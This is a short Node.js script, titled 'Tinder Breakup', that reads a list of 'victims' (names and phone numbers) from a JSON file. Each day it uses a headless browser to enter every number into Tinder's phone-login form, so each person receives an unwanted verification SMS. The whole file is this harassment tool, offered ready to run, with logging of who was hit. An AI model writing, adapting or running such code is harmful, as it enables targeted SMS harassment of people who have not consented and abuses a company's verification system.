const puppeteer = require("puppeteer");
const cron = require("node-cron");
const figlet = require("figlet");
const victims = require("../src/victims.json");

figlet('Tinder Breakup', function (error, data) {
    if (error) {
        return;
    }
    console.log(data);
    console.log("Message will be sent at 12:00 on every day-of-month")
});

function SendSMSDaily() {
    (async () => {
        const url = "https://tinder.onelink.me/9K8a/3d4abb81";
        const browser = await puppeteer.launch();
        const page = await browser.newPage();

        for (key in victims) {
            await page.goto(url, { waitUntil: 'networkidle2' });
            await page.click('button[aria-label="Log in with phone number"]');
            console.log(`\nTrying number: ${victims[key].number}`);
            await page.waitForSelector('input[name="phone_number"]');
            await page.type('input[name="phone_number"]', victims[key].number);
            await page.keyboard.press('Enter');
            console.log(`[SMS SENT] Owner: ${victims[key].name} | Number: ${victims[key].number}`);
            console.log(`[WAITING] New message will be sent in 60 seconds...`);
            await page.waitForTimeout(60000);
        };
        await browser.close();
    })();
}

cron.schedule('0 12 */1 * *', () => {
    console.log('\n[CRON-JOB] daily message service started...');
    SendSMSDaily();
});